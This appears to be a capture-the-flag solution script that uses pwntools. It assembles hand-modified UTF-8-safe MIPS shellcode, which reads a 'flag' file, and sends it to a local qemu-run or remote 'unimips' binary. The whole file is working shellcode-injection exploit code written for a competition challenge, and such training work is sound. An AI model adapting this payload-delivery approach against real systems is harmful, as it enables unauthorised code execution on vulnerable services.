#!/usr/bin/python
from pwn import * #if you don't have this apt install pwntools
from time import sleep
from sys import argv

context.arch = 'mips'

#start with pwntools shellcode and modify manually to be UTF-8
#open('shellcode.orig','wb').write(shellcraft.mips.linux.cat('flag')+shellcraft.mips.linux.exit(0))

#compile modified shellcode
payload = asm(open('shellcode.asm','rb').read())+'\n'

try:
    if (argv[1] == 'debug'):
        p = process('cd ../src/; /usr/bin/qemu-mipsel-static -g 9999 ./unimips',shell=True)
    else:
        p = remote(argv[1],int(argv[2]))
    print p.recvuntil('> ')
except KeyboardInterrupt:
    print "Aborted."
except:
    print "Usage: solution.py [debug | <host> <port>]"
    exit()


p.send(payload)

print "Flag: "
print p.recv(1024)
p.interactive()
